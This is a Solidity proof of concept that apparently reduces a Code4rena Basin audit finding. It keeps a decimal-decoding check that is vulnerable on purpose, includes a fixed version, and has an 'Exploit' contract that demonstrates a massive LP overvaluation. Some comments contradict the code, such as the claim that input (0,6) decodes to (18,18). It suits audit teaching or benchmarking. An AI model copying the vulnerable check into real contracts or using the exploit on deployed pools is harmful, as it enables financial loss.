// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Basin — Incorrectly assigned decimal1 parameter upon decoding
    (Code4rena 2024-07-basin, [H-02], finding #36914, reporter rare_one)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.
    Root cause: Stable2.decodeWellData sets decimal1=18 when decimal0==0
    instead of when decimal1==0. With well data (0, 6) the decoder returns
    (18, 18) instead of (18, 6), so token1 reserves are scaled as 18-dec
    instead of 6-dec — severe price/LP misvaluation. When decimal1 is 0 and
    decimal0 is non-zero, decimal1 stays 0 and scaling overflows.

    Vulnerable check preserved VERBATIM (@> VULN). No fork, no cheats.
//////////////////////////////////////////////////////////////////////////*/

/// @notice Reduced Stable2 with decodeWellData + a scaling helper that
///         demonstrates misvaluation when decimals are wrong.
contract Stable2 {
    error InvalidTokenDecimals();

    /// @notice Verbatim decodeWellData from Stable2.sol (vulnerable decimal1 check).
    function decodeWellData(bytes memory data) public pure returns (uint256[] memory decimals) {
        (uint256 decimal0, uint256 decimal1) = abi.decode(data, (uint256, uint256));

        // if well data returns 0, assume 18 decimals.
        if (decimal0 == 0) {
            decimal0 = 18;
        }
        if (decimal0 == 0) { // @> VULN: checks decimal0 instead of decimal1 — so decimal1=0 is never coerced to 18
            decimal1 = 18;
        }
        // FIX: if (decimal1 == 0) { decimal1 = 18; }
        if (decimal0 > 18 || decimal1 > 18) revert InvalidTokenDecimals();

        decimals = new uint256[](2);
        decimals[0] = decimal0;
        decimals[1] = decimal1;
    }

    /// @dev Scale a raw reserve to 18 decimals using decoded decimal (what calcLpTokenSupply does).
    function scaleTo18(uint256 reserve, uint256 tokenDecimals) public pure returns (uint256) {
        // When tokenDecimals is 0 this under/overflows or multiplies by 1e18 wrongly.
        if (tokenDecimals > 18) revert InvalidTokenDecimals();
        return reserve * (10 ** (18 - tokenDecimals));
    }

    /// @dev Toy "LP supply" = sum of 18-dec scaled reserves (enough to show misvaluation).
    function calcLpTokenSupply(uint256[] memory reserves, bytes memory data) external pure returns (uint256 lp) {
        uint256[] memory dec = decodeWellData(data);
        lp = scaleTo18(reserves[0], dec[0]) + scaleTo18(reserves[1], dec[1]);
    }
}

/// @notice Correct decoder for the control / expected value.
contract Stable2Fixed {
    error InvalidTokenDecimals();

    function decodeWellData(bytes memory data) public pure returns (uint256[] memory decimals) {
        (uint256 decimal0, uint256 decimal1) = abi.decode(data, (uint256, uint256));
        if (decimal0 == 0) decimal0 = 18;
        if (decimal1 == 0) decimal1 = 18; // correct check
        if (decimal0 > 18 || decimal1 > 18) revert InvalidTokenDecimals();
        decimals = new uint256[](2);
        decimals[0] = decimal0;
        decimals[1] = decimal1;
    }

    function scaleTo18(uint256 reserve, uint256 tokenDecimals) public pure returns (uint256) {
        return reserve * (10 ** (18 - tokenDecimals));
    }

    function calcLpTokenSupply(uint256[] memory reserves, bytes memory data) external pure returns (uint256 lp) {
        uint256[] memory dec = decodeWellData(data);
        lp = scaleTo18(reserves[0], dec[0]) + scaleTo18(reserves[1], dec[1]);
    }
}

/// CREATE order: vulnerable Stable2 (1), fixed Stable2Fixed (2).
contract Exploit {
    Stable2 public vulnerable;
    Stable2Fixed public fixedFn;

    // token0: 6 decimals encoded as 0 (meaning "use 18" per well convention is NOT this —
    // we use the judge's high case path: decimal0 non-zero-after-coerce issues.
    // Case A (finding + judge): decimal0=0 (→18), decimal1=6 is OK by accident.
    // Case B (overflow / wrong): decimal0=6, decimal1=0 — second check dead, decimal1 stays 0.
    // Case C (finding text): decimal0=0, decimal1=0 — decimal1 stays 0 after first coerce.

    uint256 public dec1Decoded;
    uint256 public wrongLp;
    uint256 public correctLp;
    uint256 public misvaluation;
    bool public scaledBlewOrWrong;

    constructor() {
        vulnerable = new Stable2(); // nonce 1
        fixedFn = new Stable2Fixed(); // nonce 2
    }

    function run() external {
        // Demonstrate the core bug: well data (6, 0) — token1 has 0 decimals in data
        // meaning "default to 18", but vulnerable decoder leaves decimal1 = 0.
        bytes memory data = abi.encode(uint256(6), uint256(0));
        uint256[] memory dec = vulnerable.decodeWellData(data);
        dec1Decoded = dec[1];
        require(dec[0] == 6, "dec0");
        require(dec1Decoded == 0, "vuln leaves decimal1 as 0");

        uint256[] memory fixedDec = fixedFn.decodeWellData(data);
        require(fixedDec[1] == 18, "fixed coerces decimal1 to 18");

        // Reserves: 1e6 units of token0 (6 dec = 1 whole), 1 whole unit of token1.
        // Correct 18-dec scaling: token0 → 1e18, token1 → 1e18, LP = 2e18.
        // Vulnerable: token1 scaled with decimals=0 → 1 * 1e18 = 1e18 if reserve is 1,
        // but real token1 with 18 decimals would store 1e18 raw; with decimal1 left at 0
        // a 1e18 raw reserve is scaled by 10^(18-0)=1e18 → 1e36 — massive overvaluation.
        uint256[] memory reserves = new uint256[](2);
        reserves[0] = 1_000_000; // 1 whole token0 @ 6 decimals
        reserves[1] = 1 ether; // 1 whole token1 @ 18 decimals (raw 1e18)

        wrongLp = vulnerable.calcLpTokenSupply(reserves, data);
        correctLp = fixedFn.calcLpTokenSupply(reserves, data);

        // correct: scale(1e6,6)+scale(1e18,18) = 1e18 + 1e18 = 2e18
        // wrong:   scale(1e6,6)+scale(1e18,0)  = 1e18 + 1e18*1e18 = 1e18 + 1e36
        require(correctLp == 2 ether, "correct LP");
        require(wrongLp > correctLp, "overvaluation");
        misvaluation = wrongLp - correctLp;
        // wrong token1 contribution is 1e36 vs correct 1e18 → delta ≈ 1e36 - 1e18
        scaledBlewOrWrong = misvaluation >= (1e36 - 1e18);
        require(scaledBlewOrWrong, "token1 massively overvalued");
        require(dec1Decoded == 0 && wrongLp > correctLp, "harm not demonstrated");
    }
}
